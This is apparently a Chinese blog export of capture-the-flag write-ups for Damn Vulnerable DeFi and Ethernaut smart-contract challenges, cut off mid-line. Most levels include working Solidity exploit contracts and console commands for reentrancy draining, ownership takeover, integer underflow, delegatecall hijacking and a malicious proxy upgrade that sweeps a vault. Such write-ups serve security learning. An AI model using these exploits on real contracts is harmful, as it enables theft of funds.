ethers.getContractFactory(&#x27;BackDoorAttacker&#x27;, attacker)).deploy(        this.walletFactory.address,        this.masterCopy.address,        this.walletRegistry.address,        users,        this.token.address    );    await Attacker.connect(attacker).attack();&#125;);\n\nClimber\nThere’s a secure vault contract guarding 10 million DVT tokens. The vault is upgradeable, following the UUPS pattern.\nThe owner of the vault, currently a timelock contract, can withdraw a very limited amount of tokens every 15 days.\nOn the vault there’s an additional role with powers to sweep all tokens in case of an emergency.\nOn the timelock, only an account with a “Proposer” role can schedule actions that can be executed 1 hour later.\nYour goal is to empty the vault.\n\nClimberTimelock 中的 execute 有一个漏洞：\nfor (uint8 i = 0; i &lt; targets.length; i++) &#123;    targets[i].functionCallWithValue(dataElements[i], values[i]);&#125;require(getOperationState(id) == OperationState.ReadyForExecution);operations[id].executed = true;\n\n这段代码违反了 check-effect-action 规则：总是先检查条件，然后设置效果，然后执行逻辑。在这里，我们先执行逻辑，然后检查条件并设置效果。\n\n授予 PROPOSER_ROLE 身份给攻击合约（以便攻击合约可以从这里调用该函数 schedule ）\n转移金库所有权给攻击者\n在攻击合约中，我们安排动作序列 grantRole,transferOwnership,schedule\n准备合约 ClimberVaultV2 ，移除条件 onlySweeper ，内部转账给攻击者。\n使用 upgrades.upgradeProxy 升级合约\n\n参考 \nUsing Proxies with Hardhat \npragma solidity ^0.8.0;import &quot;./ClimberVault.sol&quot;;import &quot;./ClimberTimelock.sol&quot;;contract ClimberAttacker &#123;    ClimberVault public immutable vault;    address payable timelock;    address[] public targets;    uint256[] public values;    bytes[] public dataElements;    constructor(address _vault, address payable _timelock) &#123;        vault = ClimberVault(_vault);        timelock = _timelock;    &#125;    function attack(address attacker) external &#123;        targets.push(timelock);        targets.push(address(vault));        targets.push(address(this));        values.push(0);        values.push(0);        values.push(0);        bytes memory data0 = abi.encodeWithSignature(            &quot;grantRole(bytes32,address)&quot;,            keccak256(&quot;PROPOSER_ROLE&quot;),            address(this)        );        bytes memory data1 = abi.encodeWithSignature(            &quot;transferOwnership(address)&quot;,            attacker        );        bytes memory data2 = abi.encodeWithSignature(&quot;schedule()&quot;);        dataElements.push(data0);        dataElements.push(data1);        dataElements.push(data2);        ClimberTimelock(timelock).execute(targets, values, dataElements, keccak256(&quot;salt&quot;));    &#125;    function schedule() external &#123;        ClimberTimelock(timelock).schedule(targets, values, dataElements, keccak256(&quot;salt&quot;));    &#125;&#125;\n\n准备 ClimberVaultV2\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol&quot;;import &quot;@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol&quot;;import &quot;@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol&quot;;import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;import &quot;./ClimberTimelock.sol&quot;;/** * @title ClimberVault * @dev To be deployed behind a proxy following the UUPS pattern. Upgrades are to be triggered by the owner. * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz) */contract ClimberVaultV2 is Initializable, OwnableUpgradeable, UUPSUpgradeable &#123;    ...    // Allows trusted sweeper account to retrieve any tokens    function sweepFundsV2(address tokenAddress) external &#123;        IERC20 token = IERC20(tokenAddress);        require(token.transfer(tx.origin, token.balanceOf(address(this))), &quot;Transfer failed&quot;);    &#125;    ...        function _authorizeUpgrade(address newImplementation) internal onlyOwner override &#123;&#125;&#125;\n\nit(&#x27;Exploit&#x27;, async function () &#123;            /** CODE YOUR EXPLOIT HERE */    //将 CimberVault 的所有者更改为攻击者    const Attack = await (await ethers.getContractFactory(&#x27;ClimberAttacker&#x27;, attacker)).deploy(        this.vault.address, this.timelock.address    );    await Attack.connect(attacker).attack(attacker.address);    //升级合约    const vaultV2 = await ethers.getContractFactory(&#x27;ClimberVaultV2&#x27;,attacker);    const attacker_vault = await upgrades.upgradeProxy(this.vault.address, vaultV2);    //耗尽所有代币    await attacker_vault.connect(attacker).sweepFundsV2(this.token.address);&#125;);\n"},{"title":"Ethernaut闯关（上）","url":"/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/","content":"Ethernaut闯关（上）平台地址：https://ethernaut.zeppelin.solutions\n1. Fallback闯关要求\n成为合约的owner\n将余额减少为0\n\n合约代码// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;contract Fallback &#123;  using SafeMath for uint256;  mapping(address =&gt; uint) public contributions;  address payable public owner;  constructor() public &#123;    owner = msg.sender;    contributions[msg.sender] = 1000 * (1 ether);  &#125;  modifier onlyOwner &#123;        require(            msg.sender == owner,            &quot;caller is not the owner&quot;        );        _;    &#125;  function contribute() public payable &#123;    require(msg.value &lt; 0.001 ether);    contributions[msg.sender] += msg.value;    if(contributions[msg.sender] &gt; contributions[owner]) &#123;      owner = msg.sender;    &#125;  &#125;  function getContribution() public view returns (uint) &#123;    return contributions[msg.sender];  &#125;  function withdraw() public onlyOwner &#123;    owner.transfer(address(this).balance);  &#125;  receive() external payable &#123;    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);    owner = msg.sender;  &#125;&#125;\n\n合约分析攻击流程\n首先点击”Get new instance”来获取一个实例\n\n查看合约地址的资产总量\nawait getBlance(instance)\n向合约转1wei，使贡献值大于0\nawait contract.contribute(&#123;value:1&#125;)\n再次获取balance，检查是否成功改变\nawait getBlance(instance)\n通过调用sendTransaction函数来触发fallback函数\nawait contract.sendTransaction(&#123;value:1&#125;)\n等交易完成后再次查看合约的owner，发现成功变为我们自己的地址\nawait contract.owner()\n调用withdraw来转走合约的所有代币\nawait contract.withdraw()\n点击”submit instance”即可完成闯关\n\n\n\n2. Fallout闯关要求获得合约所有权\n合约代码// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;contract Fallout &#123;    using SafeMath for uint256;  mapping (address =&gt; uint) allocations;  address payable public owner;  // constructor   function Fal1out() public payable &#123;    owner = msg.sender;    allocations[owner] = msg.value;  &#125;  modifier onlyOwner &#123;\t        require(\t            msg.sender == owner,\t            &quot;caller is not the owner&quot;\t        );\t        _;\t    &#125;  function allocate() public payable &#123;    allocations[msg.sender] = allocations[msg.sender].add(msg.value);  &#125;  function sendAllocation(address payable allocator) public &#123;    require(allocations[allocator] &gt; 0);    allocator.transfer(allocations[allocator]);  &#125;  function collectAllocations() public onlyOwner &#123;    msg.sender.transfer(address(this).balance);  &#125;  function allocatorBalance(address allocator) public view returns (uint) &#123;    return allocations[allocator];  &#125;&#125;\n\n合约分析构造函数名称与合约名称不一致，同时在构造函数中指定了函数调用者直接为合约的owner\n攻击流程\n点击“Get new instance”来获取示例\n\n调用构造函数来更换owner\nawait contract.Fal1out()\n点击“submit instance”来提交答案\n\n\n\n3. Coin Flip闯关要求这是一个掷硬币的游戏，你需要连续的猜对结果。完成这一关，你需要通过你的超能力来连续猜对十次。\n合约代码// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;contract CoinFlip &#123;  using SafeMath for uint256;  uint256 public consecutiveWins;  uint256 lastHash;  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;  constructor() public &#123;    consecutiveWins = 0;  &#125;  function flip(bool _guess) public returns (bool) &#123;    uint256 blockValue = uint256(blockhash(block.number.sub(1)));    if (lastHash == blockValue) &#123;      revert();    &#125;    lastHash = blockValue;    uint256 coinFlip = blockValue.div(FACTOR);    bool side = coinFlip == 1 ? true : false;    if (side == _guess) &#123;      consecutiveWins++;      return true;    &#125; else &#123;      consecutiveWins = 0;      return false;    &#125;  &#125;&#125;\n\n合约分析随机数问题\n这题就是用了block.blockhash(block.number-1)，这个表示上一块的hash，然后去除以2^255\n攻击流程pragma solidity ^0.4.18;contract CoinFlip &#123;  uint256 public consecutiveWins;  uint256 lastHash;  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;  function CoinFlip() public &#123;    consecutiveWins = 0;  &#125;  function flip(bool _guess) public returns (bool) &#123;    uint256 blockValue = uint256(block.blockhash(block.number-1));    if (lastHash == blockValue) &#123;      revert();    &#125;    lastHash = blockValue;    uint256 coinFlip = blockValue/FACTOR;    bool side = coinFlip == 1 ? true : false;    if (side == _guess) &#123;      consecutiveWins++;      return true;    &#125; else &#123;      consecutiveWins = 0;      return false;    &#125;  &#125;&#125;contract exploit &#123;    address public con_addr = 0x50F027e7e09791A2DbC86E38AbdC1f8FE41d7A9B; //此处是实例地址    CoinFlip expFlip = CoinFlip(con_addr);    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;    function guess() public &#123;        uint256 blockValue = uint256(block.blockhash(block.number-1));        uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);        bool guess = coinFlip == 1 ? true : false;        expFlip.flip(guess);    &#125;&#125;\n\n在remix中部署合约，并点击guess十次\n\n期间可使用 await contract.consecutiveWins() 来查询成功次数\n\n4. Telephone闯关要求获取合约的owner权限\n合约代码// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Telephone &#123;  address public owner;  constructor() public &#123;    owner = msg.sender;  &#125;  function changeOwner(address _owner) public &#123;    if (tx.origin != msg.sender) &#123;      owner = _owner;    &#125;  &#125;&#125;\n\n合约分析这里涉及到了tx.origin和msg.sender的区别，前者表示交易的发送者，后者则表示消息的发送者，如果情景是在一个合约下的调用，那么这两者是木有区别的，但是如果是在多个合约的情况下，比如用户通过A合约来调用B合约，那么对于B合约来说，msg.sender就代表合约A，而tx.origin就代表用户\n攻击流程pragma solidity ^0.6.0;contract Telephone &#123;  address public owner;  constructor() public &#123;    owner = msg.sender;  &#125;  function changeOwner(address _owner) public &#123;    if (tx.origin != msg.sender) &#123;      owner = _owner;    &#125;  &#125;&#125;contract exploit &#123;    Telephone target = Telephone(0x2b5e81876E14b3E0E1337F6BA7bc4A2d8844c904);//实例地址    function attack() public &#123;        target.changeOwner(0x9DC97146b924263A2c8C7237FbeEAFb6ef60b624);//自己的地址    &#125;&#125;\n\n可使用await contract.owner()来查询合约的owner\n\n5. Token闯关要求这一关的目标是攻破下面这个基础 token 合约\n你最开始有20个 token, 如果你通过某种方法可以增加你手中的 token 数量,你就可以通过这一关,当然越多越好  \n合约代码// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Token &#123;  mapping(address =&gt; uint) balances;  uint public totalSupply;  constructor(uint _initialSupply) public &#123;    balances[msg.sender] = totalSupply = _initialSupply;  &#125;  function transfer(address _to, uint _value) public returns (bool) &#123;    require(balances[msg.sender] - _value &gt;= 0);    balances[msg.sender] -= _value;    balances[_to] += _value;    return true;  &#125;  function balanceOf(address _owner) public view returns (uint balance) &#123;    return balances[_owner];  &#125;&#125;\n\n合约分析整数溢出\n这里的balances和value都是无符号整数，所以无论如何他们相减之后值依旧大于等于0\n攻击流程pragma solidity ^0.6.0;contract Token &#123;  mapping(address =&gt; uint) balances;  uint public totalSupply;  constructor(uint _initialSupply) public &#123;    balances[msg.sender] = totalSupply = _initialSupply;  &#125;  function transfer(address _to, uint _value) public returns (bool) &#123;    require(balances[msg.sender] - _value &gt;= 0);    balances[msg.sender] -= _value;    balances[_to] += _value;    return true;  &#125;  function balanceOf(address _owner) public view returns (uint balance) &#123;    return balances[_owner];  &#125;&#125;contract exploit &#123;    address public con_addr = 0xf36B064eB8f9120392C6b352210566D6D8340700;    address public trans_to = 0x9DC97146b924263A2c8C7237FbeEAFb6ef60b624;    Token token = Token(con_addr);    uint overvalue = 21;    function attack() public &#123;        token.transfer(trans_to,overvalue);    &#125;&#125;\n\n\n6. Delegation闯关要求这一关的目标是申明你对你创建实例的所有权.\n合约代码// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Delegate &#123;  address public owner;  constructor(address _owner) public &#123;    owner = _owner;  &#125;  function pwn() public &#123;    owner = msg.sender;  &#125;&#125;contract Delegation &#123;  address public owner;  Delegate delegate;  constructor(address _delegateAddress) public &#123;    delegate = Delegate(_delegateAddress);    owner = msg.sender;  &#125;  fallback() external &#123;    (bool result,) = address(delegate).delegatecall(msg.data);    if (result) &#123;      this;    &#125;  &#125;&#125;\n\n合约分析\nSolidity 支持两种底层调用方式 call 和 delegatecall\ncall 外部调用时，上下文是外部合约\ndelegatecall 外部调用时，上下文是调用合约\ncall 与 delegatecall 的功能类似，区别仅在于后者仅使用给定地址的代码，其它信息则使用当前合约(如存储，余额等等)。\n函数的设计目的是为了使用存储在另一个合约的库代码。\n二者执行代码的上下文环境的不同，当使用call调用其它合约的函数时，代码是在被调用的合约的环境里执行，对应的，使用delegatecall进行函数调用时代码则是在调用函数的合约的环境里执行。\n所以 delegate.delegatecall(msg.data) 其实调用的是 delegate 自身的 msg.data\n\ndata 头4个 byte 是被调用方法的签名哈希，即 bytes4(keccak256(&quot;func&quot;)) , remix 里调用函数，实际是向合约账户地址发送了( msg.data[0:4] == 函数签名哈希 )的一笔交易\n所以我们只需调用 Delegation 的 fallback 的同时在 msg.data 放入 pwn 函数的签名即可\n\nfallback 的触发条件：\n\n一是如果合约在被调用的时候，找不到对方调用的函数，就会自动调用 fallback 函数\n二是只要是合约收到别人发送的 Ether 且没有数据，就会尝试执行 fallback 函数，此时 fallback 需要带有 payable 标记，否则，合约就会拒绝这个 Ether\n\n\n\n所以，通过转账触发 Delegation 合约的 fallback 函数，同时设置 data 为 pwn 函数的标识符。\n攻击流程//sha3的返回值前两个为0x，所以要切0-10个字符。contract.sendTransaction(&#123;data: web3.utils.sha3(&quot;pwn()&quot;).slice(0,10)&#125;);\n\n可能会out of gas，提高gas上限即可\n\n7. Force闯关要求使合约的余额大于0\n合约代码// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Force &#123;/*                   MEOW ?         /\\_/\\   /    ____/ o o \\  /~____  =ø= / (______)__m_m)*/&#125;\n\n合约分析在以太坊里我们是可以强制给一个合约发送eth的，不管它要不要它都得收下，这是通过selfdestruct函数来实现的，如它的名字所显示的，这是一个自毁函数，当你调用它的时候，它会使该合约无效化并删除该地址的字节码，然后它会把合约里剩余的资金发送给参数所指定的地址，比较特殊的是这笔资金的发送将无视合约的fallback函数，因为我们之前也提到了当合约直接收到一笔不知如何处理的eth时会触发fallback函数，然而selfdestruct的发送将无视这一点。\n攻击流程pragma solidity 0.4.20;contract Force &#123;    function Force() public payable &#123;&#125;    function attack(address _target) public &#123;        selfdestruct(_target);    &#125;&#125;\n\n可以用getBalance(instance)来查询实例余额\n记得部署合约的时候存一点钱进去\n\n8. Vault闯关要求打开 vault 来通过这一关!\n合约代码// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Vault &#123;  bool public locked;  bytes32 private password;  constructor(bytes32 _password) public &#123;    locked = true;    password = _password;  &#125;  function unlock(bytes32 _password) public &#123;    if (password == _password) &#123;      locked = false;    &#125;  &#125;&#125;\n\n合约分析使用web3.eth.getStorageAt()方法返回一个以太坊地址的指定位置存储内容，借此获得密码内容\n\n攻击流程\nweb3.eth.getStorageAt(contract.address, 1)\n\n\ncontract.unlock(&#39;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&#39;)\n均报错\n\n成功\n\n\n\n\n9. King闯关要求下面的合约表示了一个很简单的游戏: 任何一个发送了高于目前价格的人将成为新的国王. 在这个情况下, 上一个国王将会获得新的出价, 这样可以赚得一些以太币. 看起来像是庞氏骗局.\n这么有趣的游戏, 你的目标是攻破他.\n当你提交实例给关卡时, 关卡会重新申明王位. 你需要阻止他重获王位来通过这一关.\n合约代码// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract King &#123;  address payable king;  uint public prize;  address payable public owner;  constructor() public payable &#123;    owner = msg.sender;      king = msg.sender;    prize = msg.value;  &#125;  receive() external payable &#123;    require(msg.value &gt;= prize || msg.sender == owner);    king.transfer(msg.value);    king = msg.sender;    prize = msg.value;  &#125;  function _king() public view returns (address payable) &#123;    return king;  &#125;&#125;\n\n合约分析只要国王拒绝接收奖励即可一直当国王。那么我们可以部署攻击合约，使用 revert() 占据合约的king不放\n攻击流程\n查询目前最高价\nweb3.utils.fromWei 能将给定的以wei为单位的值转换为其他单位的数值。\nweb3.utils.fromWei(&#x27;1&#x27;, &#x27;ether&#x27;); //默认&gt; &quot;0.000000000000000001&quot;web3.utils.fromWei(&#x27;1&#x27;, &#x27;finney&#x27;);&gt; &quot;0.000000000000001&quot;web3.utils.fromWei(&#x27;1&#x27;, &#x27;szabo&#x27;);&gt; &quot;0.000000000001&quot;web3.utils.fromWei(&#x27;1&#x27;, &#x27;shannon&#x27;);&gt; &quot;0.000000001&quot;\n\n直接使用 fromWei(contract.prize) 会报错\n\n可使用 toBN() 转换一下\n\n即出价比0.001ether高即可\n\n查询现在的king\n\n\n部署合约\npragma solidity 0.4.18;contract attack &#123;    function attack(address _add) public payable &#123;        _add.call.gas(1000000).value(msg.value)();    &#125;    function () public &#123;        revert();    &#125;&#125;\n提交实例\n可以看到再次查询king的地址变为了攻击合约的地址\n\n\n\n10. Re-entrancy闯关要求这一关的目标是偷走合约的所有资产.\n合约代码// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;contract Reentrance &#123;    using SafeMath for uint256;  mapping(address =&gt; uint) public balances;  function donate(address _to) public payable &#123;    balances[_to] = balances[_to].add(msg.value);  &#125;  function balanceOf(address _who) public view returns (uint balance) &#123;    return balances[_who];  &#125;  function withdraw(uint _amount) public &#123;    if(balances[msg.sender] &gt;= _amount) &#123;      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);      if(result) &#123;        _amount;      &#125;      balances[msg.sender] -= _amount;    &#125;  &#125;  receive() external payable &#123;&#125;&#125;\n\n合约分析重入\n攻击流程pragma solidity ^0.6.10;import &quot;@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol&quot;;contract Reentrance &#123;    using SafeMath for uint256;  mapping(address =&gt; uint) public balances;  function donate(address _to) public payable &#123;    balances[_to] = balances[_to].add(msg.value);  &#125;  function balanceOf(address _who) public view returns (uint balance) &#123;    return balances[_who];  &#125;  function withdraw(uint _amount) public &#123;    if(balances[msg.sender] &gt;= _amount) &#123;      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);      if(result) &#123;        _amount;      &#125;      balances[msg.sender] -= _amount;    &#125;  &#125;  receive() external payable &#123;&#125;&#125;contract exploit &#123;   //设定目标合约地址  Reentrance reentrance;  constructor(address payable instance_add) public payable &#123;    reentrance = Reentrance(instance_add);  &#125;  //重写fallback  fallback() external payable &#123;    if(address(reentrance).balance &gt;= 0 ether)&#123;      reentrance.withdraw(0.001 ether);    &#125;  &#125;  //攻击，调用withdraw  function attack() external &#123;    reentrance.donate&#123;value: 0.002 ether&#125;(address(this));    reentrance.withdraw(0.001 ether);  &#125;  //查询余额  function instance_balance() public view returns (uint) &#123;    return address(reentrance).balance;  &#125;   &#125;\n\n部署合约时打入一些钱\n\n使用函数查询实例合约中原有余额\n\n攻击完成后再次查询余额\n\n也可以在控制台中查询\n\n11. Elevator闯关要求电梯不会让你达到大楼顶部, 对吧?\n合约代码// SPDX-License-Identifier: MITpragma solidity ^0.6.0;interface Building &#123;  function isLastFloor(uint) external returns (bool);&#125;contract Elevator &#123;  bool public top;  uint public floor;  function goTo(uint _floor) public &#123;    Building building = Building(msg.sender);    if (! building.isLastFloor(_floor)) &#123;      floor = _floor;      top = building.isLastFloor(floor);    &#125;  &#125;&#125;\n\n合约分析重新编写isLastFloor函数，并设置flag初始为true。在实例的goTo函数中，会调用两次isLastFloor函数，即第一次让flag变为false，第二次让flag变为true\n攻击流程pragma solidity ^0.6.0;interface Building &#123;  function isLastFloor(uint) external returns (bool);&#125;contract Elevator &#123;  bool public top;  uint public floor;  function goTo(uint _floor) public &#123;    Building building = Building(msg.sender);    if (! building.isLastFloor(_floor)) &#123;      floor = _floor;      top = building.isLastFloor(floor);    &#125;  &#125;&#125;contract exploit &#123;    address instance_add = 0x98aD02A12F92eADb16dcF5285568CA7826B4b947;    Elevator elevator = Elevator(instance_add);    bool flag = true;    function isLastFloor(uint) external returns (bool) &#123;        flag = !flag;        return flag;    &#125;    function attack() public &#123;        elevator.goTo(5);    &#125;&#125;\n\n查看top状态并提交实例\n\n12. Privacy闯关要求这个合约的制作者非常小心的保护了敏感区域的 storage.\n解开这个合约来完成这一关.\n合约代码// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Privacy &#123;  bool public locked = true;  uint256 public ID = block.timestamp;  uint8 private flattening = 10;  uint8 private denomination = 255;  uint16 private awkwardness = uint16(now);  bytes32[3] private data;  constructor(bytes32[3] memory _data) public &#123;    data = _data;  &#125;    function unlock(bytes16 _key) public &#123;    require(_key == bytes16(data[2]));    locked = false;  &#125;  /*    A bunch of super advanced solidity algorithms...      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\\      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU  */&#125;\n\n合约分析升级版vault，用 getStorageAt() 把链上的数据读出来\n攻击流程根据优化存储原则：如果下一个变量长度和上一个变量长度加起来不超过256bits（32字节），它们就会存储在同一个插槽里\n通过查询得到\n\n可以分析\nweb3.eth.getStorageAt(contract.address,0)//0x0000000000000000000000000000000000000000000000000000000000000001  //locked = true 1字节 01web3.eth.getStorageAt(contract.address,1)//0x0000000000000000000000000000000000000000000000000000000062178997  //ID = block.timestamp 常量web3.eth.getStorageAt(contract.address,2)//0x000000000000000000000000000000000000000000000000000000008997ff0a // flattening = 10 1字节 0a//denomination = 255 1字节 ff//awkwardness = uint16(now) 2字节web3.eth.getStorageAt(contract.address,3)//0xf29eea5d3875c68825a80d9c459dec52f5bbd55dd5ce827e00ec92ae60f7ddb2  //data[0]web3.eth.getStorageAt(contract.address,4)//0x153a7c6b4bf25f3a526a687713411c5ca83ae18c6f8950ff0f09be93bd36cb95  //data[1]web3.eth.getStorageAt(contract.address,5)//0x0b444a369c67e1d2436e5410d7c891644b6f088cb5f3451cc11f5ae67c451e18  //data[2]\n\n所以解锁需要的data[2]应该是0x0b444a369c67e1d2436e5410d7c89164\ncontract.unlock(&#x27;0x0b444a369c67e1d2436e5410d7c89164&#x27;)\n\n检查解锁成功\n\n提交实例\n\n"},{"title":"Ethernaut闯关（下）","url":"/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/","content":"Ethernaut闯关（上）平台地址：https://ethernaut.zeppelin.solutions\n13. Gatekeeper One闯关要求越过守门人并且注册为一个参赛者来完成这一关.\n合约代码// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;contract GatekeeperOne &#123;  using SafeMath for uint256;  address public entrant;  modifier gateOne() &#123;    require(msg.sender != tx.origin);    _;  &#125;  modifier gateTwo() &#123;    require(gasleft().mod(8191) == 0);    _;  &#125;  modifier gateThree(bytes8 _gateKey) &#123;      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);      require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);      require(uint32(uint64(_gateKey)) == uint16(tx.origin), &quot;GatekeeperOne: invalid gateThree part three&quot;);    _;  &#125;  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;    entrant = tx.origin;    return true;  &#125;&#125;\n\n合约分析gateOne，通过另一个合约调用即可\ngateTwo，需要满足 gasleft() % 8191 == 0\n先对合约进行debug，将燃料限制调到999999\n\nattack后，去etherscan中看一下debug trace\n\n因为第二个条件执行了gasleft()，我们需要找一下Gas操作：获取剩余可执行燃料数\n由于Gas本身的操作也是消耗燃气的，所以958082才是gas操作获得的剩余可执行燃气数\n\n958082%8191=7926\n999999-7926=992073\n再将燃料限制调到992073\n\n950280%8191=124\n992073-124=991949\n再将燃料限制调到991949\n\n950158%8191=2\n991949-2=991947\n再将燃料限制调到991947\n\n此时已经没有revert\n\n且950156%8191=0\ngateThree，先了解一下 Solidity 的类型转换规则\n转换成更小的类型，会丢失高位。\nuint32 a = 0x12345678;uint16 b = uint16(a); // b = 0x5678\n\n转换成更大的类型，将向左侧添加填充位。\nuint16 a = 0x1234;uint32 b = uint32(a); // b = 0x00001234 \n\n转换到更小的字节类型，会丢失后面数据。\nbytes2 a = 0x1234;bytes1 b = bytes1(a); // b = 0x12\n\n转换为更大的字节类型时，向右添加填充位。\nbytes2 a = 0x1234;bytes4 b = bytes4(a); // b = 0x12340000\n\n只有当字节类型和int类型大小相同时，才可以进行转换。\nbytes2 a = 0x1234;uint32 b = uint16(a); // b = 0x00001234uint32 c = uint32(bytes4(a)); // c = 0x12340000uint8 d = uint8(uint16(a)); // d = 0x34uint8 e = uint8(bytes1(a)); // e = 0x12\n\n把整数赋值给整型时，不能超出范围，发生截断，否则会报错。\nuint8 a = 12; // no erroruint32 b = 1234; // no erroruint16 c = 0x123456; // error, 有截断，变为 0x3456\n\n观察代码，得出可以通过 bytes8(tx.origin) &amp; 0xFFFFFFFF0000FFFF 实现\n攻击流程pragma solidity ^0.6.0;import &quot;@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol&quot;;contract GatekeeperOne &#123;  using SafeMath for uint256;  address public entrant;  modifier gateOne() &#123;    require(msg.sender != tx.origin);    _;  &#125;  modifier gateTwo() &#123;    require(gasleft().mod(8191) == 0);    _;  &#125;  modifier gateThree(bytes8 _gateKey) &#123;      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);      require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);      require(uint32(uint64(_gateKey)) == uint16(tx.origin), &quot;GatekeeperOne: invalid gateThree part three&quot;);    _;  &#125;  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;    entrant = tx.origin;    return true;  &#125;&#125;contract exploit &#123;    address instance_add = 0x3fADc7E018F9b0236f82132B0569e7c4363622f0;    GatekeeperOne gatekeeperOne = GatekeeperOne(instance_add);    function attack() public &#123;        bytes8 gateKey = bytes8(uint64(tx.origin)) &amp; 0xFFFFFFFF0000FFFF;        //gatekeeperOne.enter&#123;gas: 999999&#125;(gateKey);        address(gatekeeperOne).call.gas(999999)(abi.encodeWithSignature(&quot;enter(bytes8)&quot;, gateKey));    &#125;&#125;\n\n使用debug调试至没有revert后，回到ethernaut中使用命令 await contract.entrant() ，发现结果是自己的地址\n\n提交实例\n\n14. Gatekeeper Two闯关要求这个守门人带来了一些新的挑战, 同样的需要注册为参赛者来完成这一关\n合约代码// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract GatekeeperTwo &#123;  address public entrant;  modifier gateOne() &#123;    require(msg.sender != tx.origin);    _;  &#125;  modifier gateTwo() &#123;    uint x;    assembly &#123; x := extcodesize(caller()) &#125;    require(x == 0);    _;  &#125;  modifier gateThree(bytes8 _gateKey) &#123;    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);    _;  &#125;  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;    entrant = tx.origin;    return true;  &#125;&#125;\n\n合约分析gateOne，使用另一个合约调用即可\ngateTwo，使用了内联汇编\nextcodesize 用来获取指定地址的合约代码大小。这里使用的是内联汇编来获取调用方(caller)的代码大小，一般来说，当caller为合约时，获取的大小为合约字节码大小,caller为账户时，获取的大小为 0 。条件为调用方代码大小为0 ，由于合约在初始化，代码大小为0。因此，我们需要把攻击合约的调用操作写在 constructor 构造函数中。\ngateThree，异或的特性就是异或两次就是原数据。所以将sender和FFFFFFFFFFFFFFFF进行异或的值就是我们想要的值。\n攻击流程pragma solidity ^0.6.0;contract GatekeeperTwo &#123;  address public entrant;  modifier gateOne() &#123;    require(msg.sender != tx.origin);    _;  &#125;  modifier gateTwo() &#123;    uint x;    assembly &#123; x := extcodesize(caller()) &#125;    require(x == 0);    _;  &#125;  modifier gateThree(bytes8 _gateKey) &#123;    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);    _;  &#125;  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;    entrant = tx.origin;    return true;  &#125;&#125;contract exploit &#123;    constructor(address instance_add) public &#123;        GatekeeperTwo gatekeeperTwo = GatekeeperTwo(instance_add);        //bytes8 gateKey = bytes8(uint64(address(this)) ^ (uint64(0) - 1)); 此处没有使用keccak256所以失败了        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this))))^(uint64(0) - 1));        //gatekeeperTwo.enter(gateKey);        address(gatekeeperTwo).call(abi.encodeWithSignature(&quot;enter(bytes8)&quot;, 